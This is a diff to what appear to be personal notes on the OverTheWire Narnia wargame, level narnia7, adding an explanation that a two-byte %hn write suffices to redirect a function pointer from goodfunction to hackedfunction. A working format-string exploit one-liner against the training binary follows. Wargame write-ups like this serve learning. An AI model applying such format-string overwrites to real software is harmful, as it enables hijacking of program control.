@@ -390,7 +390,11 @@ $
 With this solution I solved with 720 blank spaces, which is way less than the previous 134514402. Neat!
 
 =================== Gotta land it 3 times =========================
-Turns out %n writes 4 bytes, %hn will write 2 bytes.
+Turns out %n writes 4 bytes, %hn will write 2 bytes. 
+Given that these two only have the 2 least significant bytes differing:
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
 So we can also solve like dis:
 
 narnia7@narnia:~$ /narnia/narnia7 $(python -c'print "\x6c\xd6\xff\xff"+"%08x"*4+"%34530x"+"%hn"')
